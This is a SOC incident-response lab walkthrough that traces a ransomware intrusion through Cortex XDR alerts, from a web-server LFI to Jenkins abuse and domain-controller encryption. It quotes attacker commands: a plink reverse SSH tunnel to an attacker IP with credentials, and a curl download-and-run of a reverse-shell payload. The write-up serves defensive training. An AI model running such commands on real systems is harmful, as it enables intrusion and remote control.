# SOC Incident Response

# Incident Response
You are enjoying a warm cup of tea on Tuesday evening when you are alerted by one of the System Administrators that the domain controller appears to have been hit by Ransomware. They tell you that they cannot open any of their files and that a note was left on their desktop instructing them to pay a ransom before all of their data will be released on the dark web and lost forever. To make matters worse, after the administrator got back to his desk to log back in, he found that his password no longer worked! The admin shares a screenshot they took as this was happening:
<img src = 'https://github.com/TechRinger/SecurED/blob/ec874c438002c52efb263ba31fa42bcef381a9e2/docs/images/DCencrypted.png'/>

You've been asked to figure out how all this happened so you can fix the security holes in the network. Thankfully, because you have a consolidated logging solution including firewall and endpoint logs, you should have sufficient data to be able to determine the root cause. 

Before we get started it's super important to have familiarity with your infrastructure when threat hunting so we can understand where each of the alerts is coming from and do our best to recognize if assets are behaving abnormally:

![image](https://github.com/TechRinger/SecurED/assets/26468606/01613a63-1c11-44be-9685-59ccef1f1a61)

Log in to your XDR dashboard and start the hunt!

At first glance, we notice that there are several incidents in the dashboard, but one stands out with a maximum score of 100, severity of "High" and at least four hosts that have contributed via alerts to the overall incident:
![image](https://github.com/TechRinger/SecurED/blob/1c3d16c15271c666fae934ba7693728c8a85d1b8/docs/images/Dashboard.png)

When we click on the Incident with the highest score, we are taken to the Incident dashboard that will show us various things such as the number of alerts that have contributed to this incident, the alert source and the assets involved as well as where each incident falls within the MITRE ATT&CK framework:
<img src='https://github.com/TechRinger/SecurED/blob/6302fc448d04ab999d6a93388679f9c4446c3816/docs/images/impact.png'/>
While there are many ways to go about threat hunting, given our scenario where we have details about the symptoms because the administrator told us they were hit with ransomware, probably the best place to star would be by clicking on the "impact" hyperlink in the MITRE ATT&CK framework. The "impact" tactic in the framework is the one that includes "data encrypted for impact" which is most likely where we will see alerts associated with the incident. After clicking on the "impact" link from the above screenshot we are taken to the alerts associated with those MITRE tactics.

Once we are taken to the page with the associated alerts we can see two contributing alerts organized from most recent to oldest. Because we want to learn about events that led up to this attack lets right click on the bottom one and select "Investigate Causality Chain>Open Card in new tab":
<img src = 'https://github.com/TechRinger/SecurED/blob/66572457e8a6a403c54caa32b740f3855872cef1/docs/images/ransomwarecc.png'/>

We can see a nice graph of undeniably related events in the causality chain view. In order to determine what process was associated with encrypting files we may generally want to start looking at processes from right to left as each process/alert has a parent that initiated it and understanding the logic flow is key to identifying loopholes:
<img src = 'https://github.com/TechRinger/SecurED/blob/d4e15759c9842c043d9af28e7636e5ce84d66458/docs/images/impactcausality.png'/>

In Cortex, any circle in the causality chain that is red is associated with "malware", so let's click on the rightmost red circle "LB3.exe" to see why it contributed to this incident. Because we know that this ransomware encrypted all the files on the domain controller we should be interested in the "file" tab to see if this executable was indeed the ransomware responsible for our DC exploit:
<img src = 'https://github.com/TechRinger/SecurED/blob/dc05eed0fa4d07fb7fd19e315cbb9cd0179a39c4/docs/images/LB3.png'/>

We can confirm that LB3.exe is definitely the ransomware executable as the file type seen above in the "File Write" process (of which there are upwards of 30k) is "YiKufXUCn" which is the name of the readme file our administrator initially shared with us which also corresponds with the file names on the DC now.

Also of importance is that the user responsible for executing this process was WHITEHATFUN\jenkins. Knowing our environment you find this odd because that user is the process admin for our CI/CD pipeline tool "Jenkins" which lives on a separate server in the DC!

While this doesn't help us get out of our ransomware situation, it gives us something to focus on....HOW did it get there? If we click on the "Alert" tab we can see that the first alert informs us that this executable was run via "cmd.exe":
<img src = 'https://github.com/TechRinger/SecurED/blob/27af9a845707cdb5f1602d8193eb334e76cb0ace/docs/images/Screenshot%202023-06-20%20at%2010.38.52%20AM.png'/>

Continuing towards the left in the causality chain, let's see what data we can get from the cmd.exe alert. Click on the cmd.exe circle in the causality chain and in the table below select the "Process" tab to view the cmd.exe child processes :
<img src = 'https://github.com/TechRinger/SecurED/blob/9b75736a7057db57a00b998cee17f8766e195e3d/docs/images/cmdlb3.png'/>

Above, we can clearly see that cmd.exe ran a powershell command to both download the LB3.exe file from the 172.16.160.100 host as well as run it which is why we also see "powershell.exe" in the causality chain as a forked off process that played some role in this attack. We also see that that this is when the attacker changed the administrators username. The question now is: who or what executed cmd.exe? 

Going back to the causality chain, we see that calculator.exe seems to be responsible for the cmd.exe process. Let's confirm this by clicking on the "calculator.exe" circle:
<img src = 'https://github.com/TechRinger/SecurED/blob/f6808737541351ad608c7d8ce7f86c6f7b8a1ffe/docs/images/calculator.png'/>

Indeed it does look like calculator.exe is malware which is something Cortex helps us identify simply by noting that any "bubble" encircled with red is identified as malware. We can also see that the path for this malware is NOT the default location for the calculator utility by looking at the "CMD" value above showing it in a user directory...this is definitely a LOLBIN. Clicking on the "process" tab also confirms that this executable spawned the cmd.exe sub process.

We can see why the calculator.exe process was identified as malware and identify what it is doing by glancing through the "All Actions" column which will have alerts generated by both the local machine and the firewall:
<img src = 'https://github.com/TechRinger/SecurED/blob/aa05fd8b93962be21245b65ae2e9e6fbf89af468/docs/images/calculatorreverse.png'/>

I don't know about you all, but my calculator app does not make outgoing connections to a different host on non-standard ports. The "network connection" we see which was captured by the firewall logs is one of the very first things this malware executes. This was probably the conduit through which the attacker gained access to the machine to then execute shell commands like opening powershell to download and execute LB3.exe.

Also, what's up with this Jenkins user? This is a name we need to make note of because it's been in all the logs and we know this user is tied to our CI/CD tool located on another windows server in our segmented "DC" zone.

Since we are done investigating calculator.exe we've reached the beginning of the causality chain, still with no clear indication as to how the executable was delivered, we must think a little outside the box. Doing some research, we find that the process responsible for the first alert in this causality chain is Windows Management Provisional Host or "wsmprovhost". 

This application is the hosting process for the WinRM service which in turn is responsible for facilitating powershell remoting...definitely curious as we noticed that powershell has already been used in this attack. While there is still no clear indication as to how this attacker got in, all signs seem to point to the user "Jenkins, " the admin user of our CI/CD pipeline tool in the data center named "Jenkins". Let's see if we can spot any funny business on that server around the same time.

*NOTE* We could also go to our query tool to filter on network connections to the DC box around the time that the wsmprovhost alert was generated on the DC to see what sources were trying to access it corroborating out suspicions.

Returning back to the main incident, let's filter out some noise by selecting "Agent Sources" and then "XDR Agent". When we are taken to the Incident Alerts Table we can right-click on an entry caused by our Jenkins server "WIN-E7MVNT898UV" and select "Show rows with ...":
<img src = 'https://github.com/TechRinger/SecurED/blob/27af9a845707cdb5f1602d8193eb334e76cb0ace/docs/images/Screenshot%202023-06-20%20at%2010.04.02%20PM.png'/>

<img src = 'https://github.com/TechRinger/SecurED/blob/27af9a845707cdb5f1602d8193eb334e76cb0ace/docs/images/Screenshot%202023-06-20%20at%2010.06.38%20PM.png'/>

When the results are filtered out, we obviously want to focus on anything with a "High" severity. Let's open the causality chain for the "high" alert with the ominous description of "In-process shellcode Protection":
<img src = 'https://github.com/TechRinger/SecurED/blob/aa05fd8b93962be21245b65ae2e9e6fbf89af468/docs/images/jenkinsmachine.png'/>

When the causality chain pops up we immediately notice that cortex has detected malware in the same calculator.exe executable...this cannot be a coincidence! Let's expand the calulator.exe bubble to see the subprocesses it spawned by right clicking on it and selecting "View children".

We see that it was responsible for starting the cmd.exe process so lets keep building out the "bubbles" to view their children until we get either to the end or to something interesting.
<img src = 'https://github.com/TechRinger/SecurED/blob/654f612474e40980a07d0e0849d139caccdc3c6b/docs/images/jenkinspstimestamp.png'/>

After some poking around we find powershell...definitely normal behavior, but given the context with which it was invoked and the timeline around it, this is something we need to look into. Looking down at the alerts in the "All Actions" column we see that powershell was yet again responsible for creating an "Outgoing" network connection to our data center (thanks firewall)! In the alert description, we also see that the destination port was 5985 which is used for WinRM which also uses wsmprovhost to handle connection requests. Could be a coincidence but we are all in IT and we don't believe in coincidence right?

To confirm our suspicions, let's compare this timestamp (16:13:34) from the Jenkins box (who's user was responsible for the alerts on the DC) with the timestamp from the first alert we received from the DC agent tied to the wsmprovhost process:

## DC:
<img src = 'https://github.com/TechRinger/SecurED/blob/654f612474e40980a07d0e0849d139caccdc3c6b/docs/images/dctimestamp.png'/>

Knowing our network is paramount to being successful in threat hunting. Having said that we need to recognize that the process responsible for the Jenkins causality chain was jenkins.exe. It would behoove us to have a conversation with the server admin responsible for this service to find out what it does and how it works to aid our hunting.

After speaking with them they told us what its role is and that it has the ability to run commands. When we drill down into each of the bubbles we see that the cmd.exe process that spawned the calculator LOLBIN did so via a batch file which the admin mentioned was one of its features. We also see that there is another cmd process which called out a batch file to download calculator.exe:

DOWNLOAD:
<img src = 'https://github.com/TechRinger/SecurED/blob/e255482f52992a1367f3287ade1d3d197de616a7/docs/images/jenkinscalcdown.png'/>

EXECUTION:
<img src = 'https://github.com/TechRinger/SecurED/blob/e255482f52992a1367f3287ade1d3d197de616a7/docs/images/jenkinscalcexe.png'/>

It seems like someone likely got access to the Jenkins box and possibly found out how to execute commands on it from the web interface (Java.exe correlation) to download and run the file. Equally as important to note is that the batch file downloaded calculator.exe from our Web server IP!!! This is definitely something we need to look into.

We've now confirmed that the Jenkins webapp was the conduit the attacker leveraged to execute local system commands. How did they do this though? A software user probably should have rights beyond the scope of what the application can do. We find that in a previous Jenkins build per the server admin that the attacker looked at the rights associated with this service before running further commands and discovered that this user has full domain admin privileges:
<img src = 'https://github.com/TechRinger/SecurED/blob/27af9a845707cdb5f1602d8193eb334e76cb0ace/docs/images/Screenshot%202023-06-21%20at%2010.45.49%20AM.png'/>

This is certainly something that needs to be addressed by adhering to the core tenants of zero trust! While we can see that the file was executed, we know how the file got on the server...via our public web server. This shouldn't be surprising however because there is no access to the DC from the public internet and very strict controls using app-id to only allow the DC zone boxes to access certain things on the public internet with a threat prevention profile tied to the policy, so unless this was an ssl session and we weren't decrypting, this file had to have been grabbed from an internal resource. 

This would be a good time to log into the web server and remove that file from the web root directory! How did the user get into Jenkins though? When we look closer at the log above we can see that the user who initiated the build was "administrator". This might be confusing because the cortex logs show that the user was "WHITEHATFUN\Jenkins" but that is because the account associated with running the batch script is not the individual user, but the service account associated with the application as it needs permissions to run system level scripts. We ask the admin what the authentication method is to get into the server and he embarrassingly tells us that the login account is still the default while they work through limiting access to specific admin-group users on the domain...what a shame!

We also know that, because Jenkins is internal, someone would have had to access it from another internal resource and since we've again reached the beginning of this causality chain, its time to do some more digging elsewhere. While there are several ways to approach this situation, let's change tactics to show the power of having multiple log sources colocated in single platform! Because we know that Jenkins is a web service and we know the IP address, we can query the network logs to see what was connecting to the Jenkins server around the time the jenkins.exe process started alerting us in the previous causality chain. Also, we suspect there must have been a pivot point in the network or an angry employee because there is no way to access this server from outside of the network. Go to the query builder by clicking on the orange Incident Response shield. Once there, select the "Network" icon:
<img src = 'https://github.com/TechRinger/SecurED/blob/c78cf7037cf6a1a60e843c57d356dc1f975a1788/docs/images/Screenshot%202023-06-21%20at%204.55.14%20PM.png'>
When we are brought to the query page, let's plug in the information we know will narrow down our search. Set the Remote IP field to be the Jenkins server, the remote port to be the port it serves web content on (8080) and the time to be August 17th by selecting the "Custom" radial button and making the start and end date the 17th. Next hit run:
<img src = 'https://github.com/TechRinger/SecurED/blob/6174f69fde390e8f09b8573b4a42db33253225af/docs/images/Screenshot%202023-08-23%20at%205.02.22%20PM.png'>
Immediately we see some alarming behavior; the logs are filled with connection attempts around the time of the exploit from the domain user "vader" to the Jenkins server. Perhaps more ominous is that we can also see a bunch of logs tied to the nmap application which is (more often than not) used for no good. 
<img src = 'https://github.com/TechRinger/SecurED/blob/c78cf7037cf6a1a60e843c57d356dc1f975a1788/docs/images/Screenshot%202023-06-21%20at%205.09.53%20PM.png'>
We could assume Vader is the root of our pain, but assumptions make a you-know-what out of U and ME. Perhaps Vader is the model employee who also works on automation projects, requiring access to the CI/CD pipeline tools at Whitehatfun!

Turns out Vader could not have been the culprit here because he didn't even know what Jenkins was and claimed to be "On Vacation destroying Jedi starting August 17th" (whatever that means). Lets return to the Incident section of Cortex and in the Alert Sources section click "See all" (Disregard the green line under XDR Agent as this is a copied image):
<img src = 'https://github.com/TechRinger/SecurED/blob/c78cf7037cf6a1a60e843c57d356dc1f975a1788/docs/images/Screenshot%202023-06-14%20at%2011.04.59%20AM.png'>
As you are, no doubt, accustomed to doing now, filter in the rows with Vader's computer by right clicking on the computer name next to one of his log entries and selecting "Show rows with":
<img src = 'https://github.com/TechRinger/SecurED/blob/d6f55c595d954668583eb85b1677a4100bb89e52/docs/images/vaderlogs.png'>
Let's right click on the most recent High severity alert in the filtered results and "Investigate Causality Chain". When the causality chain pops up something that may immediately stand out is that we see the same pesky, red encircled calulator.exe process we've seen in both the jenkins and DC boxes...we MUST be on the right track! Let's start on the right side again and see what info we can dig up with regards to that plink.exe process which is a command line interface for putty:
<img src = 'https://github.com/TechRinger/SecurED/blob/87cfbc7e1d5fb11f88f9f052228152b879ab12cd/docs/images/plink.png'>
Right out of the gate we notice a normal putty command that may have sketchy intentions. 

## A quick excerpt on SSH tunneling:
```bash
plink.exe -ssh -R
```
This instructs the local computer to set up an ssh tunnel using the (-R)emote option which instructs the target to configure itself in the manner configured next:
```bash
13389:localhost:3389 -P 22
```
This tells said target to install a rule in its forwarding table to take any traffic destined to itself and forward it on port 3389 through the ssh tunnel to the host that instantiated it
```bash
-l kali -pw password 172.16.160.100
```
This instructs putty to send "kali" as the (L)ogin user and "password" as the (-p[ass]w[ord]) to the host at IP 172.16.160.100.

Being that 3389 is the port RDP uses, it seems that whoever initiated this wanted to open up an RDP session to Vader, but because the attacker is unable to route to Vader's private address this would otherwise be impossible. However, since they had a shell connection via a reverse shell (shell-code protection alert on the port 4444 network connection) they were able to have Vader's machine make a connection outbound to them (172.16.160.100) via ssh and have GUI access, using RDP, from port forwarding rules pointing across the tunnel.

## Back to threat hunting
Clearly cmd.exe was the process that invoked plink and as we know now, "calculator.exe" is an executable that spawns an outbound network connection to 172.16.160.100 using port 4444 reverse shell which is why we always see cmd.exe start after it. Although cmd.exe is always after it, what the hacker does at each stop varies slightly (Vader downloaded plink.exe and built an ssh tunnel whereas Jenkins used powershell to change DC passwords and transfer files to the DC). 

What we still don't know is where the malware came from. However, what's interesting in this causality chain is that calculator.exe was called out by the cmd.exe process on behalf of the Microsoft Word application! One thing to note is that the microsoft word executable is not encircled with red which means XDR knows the application has a trusted signature on it, so there is a possibility that something within the document it was accessing was likely the root cause. What's nice about XDR is that we can see the Causality Group Owner (CGO) command that led to any given process being referenced. If we click on the calculator.exe bubble we can scroll to the right in the process tab (or most any other tab for that matter) to see what specifically called out this exe:
<img src = 'https://github.com/TechRinger/SecurED/blob/68a3905375e19c826402a0b95054d394e921e8d1/docs/images/contactlist.png'>
It looks like the "WINWORD.EXE" process was responsible for the executable being launched and specifically the document named "Steph and Chris contacts list". To see specifically what this document was doing, we can select the cmd.exe bubble that is to the right of the WINWORD.exe bubble to look for something that will help us out. In this case, the description is sufficient, but there are several places within the alerts/actions pane that will show us the target commands the process made:
<img src = 'https://github.com/TechRinger/SecurED/blob/3366fd46f04006a2f979cda9a8781db8e2b506d5/docs/images/calculatorcalloutword.png'>
It looks like the word process spawned a few commands with some very useful information in them:

	curl -o ... http://172.168.160.104/calculator.exe
	c:\Users\Publice\calculator.exe

The most notable thing is that, yet again, we see our public webserver referenced as the location to grab the malware we've seen many times up to this point. But why was this function done via word this time? Things we can infer:

	a) We know that almost all of the malicious files thus far (save for LB3.exe) have been grabbed directly from the web server
	b) The web server is the only publicly available asset thanks to DNAT (or FQDN with pubilc IP)
	c) None of the other infected boxes are workstations, which is likely why we don't see WINWORD.exe giving us headaches anywhere else.

What this tells me is that there was likely a vulnerability on the web server that needs to get patched up, and that if it was exploited and is used as a file server for the calculator.exe malware rather than just placing it directly on the user machines and servers that the attacker was unable to branch out of the DMZ zone. The next course of action they took after staging the reverse shell executable was to try to reach out to users likely via a phishing campaign, enticing them to grab the file and run it to give him access to domain computers.

From here, let's go back to the dashboard and investigate that other incident with a score of 20:
<img src = 'https://github.com/TechRinger/SecurED/blob/440715f82dc64671091bece54ea134571478c71c/docs/images/incident20.png'>
When we get to the incident section select "See all" alert sources. When we get to the alerts for that incident, we can scroll over to the description section to tell us all we need to know! We see that there seem to be several alerts tied to "Web application attack detection":
<img src = 'https://github.com/TechRinger/SecurED/blob/440715f82dc64671091bece54ea134571478c71c/docs/images/lfi.png'>
This shows us that there was a PHP script that was run to open a reverse shell to 172.16.160.100 using socat (netcat alternative) which should NOT be something that is allowed on a web server (include statement is a web security vulnerability allowing for Local File Inclusion (LFI) in the URL path). This may be where everything started and if not for some security hygiene oversights, this entire attack could have been prevented! While this does not confirm that this is how calculator.exe was put on the server, we can go to the query builder to search for that filename and see when the first occurrence of it being seen on our network was.

In order to do this, go to the main XDR page then Incident Response>Investigation>Query Builder and select "File" as the query type, type "calculator.exe" as the Name and use the 17th as the "Custom" date:
<img src = 'https://github.com/TechRinger/SecurED/blob/440715f82dc64671091bece54ea134571478c71c/docs/images/filequery.png'>
When the results populate, we are most interested in either a match associated with our web application (DVWA) or the first time this file was seen...fortunately for us, the oldest log was from the DVWA machine:
<img src = 'https://github.com/TechRinger/SecurED/blob/440715f82dc64671091bece54ea134571478c71c/docs/images/filefirstseen.png'>
To get more data and close this investigation out, right click on the alert and view it in the causality chain:
https://github.com/TechRinger/SecurED/blob/5b9cca3ff85ed49efdbfcb5a35d8b269db2090c8/docs/images/socatandcalcfound.png
This is promising. We can see that socat popped up again showing us that it was used to call out "curl" which was subsequently used to fetch the calculator.exe file from that same up-to-no-good ip! The only remaining question that comes up is "why was this not included in the incident?". The answer is because this was a PE file on a Linux machine and the XDR agent only performs local analysis on ELF files which is why the agent did not catch calculator.exe as malware. Fortunately for us, we have our firewall logs that show this file in transit at the same time:
<img src = 'https://github.com/TechRinger/SecurED/blob/333059f76f01aec372af989560dab33905fa923c/docs/images/firewallcalc.png'>
Had I had the firewall certificate updated after I spun up a new VM we would have seen that firewall log in the causality chain associated with the socat LFI alerts and saved us a little bit of work, but this is a shared lab and I can't control what others are doing in this environment. I can give an example of what this would look like with the added firewall context however from a previous walkthrough:
<img src = 'https://github.com/TechRinger/SecurED/blob/c72dbedd71971eddfafd9d4cbb8665c48b17ffe5/docs/images/withfirewall.png'>.
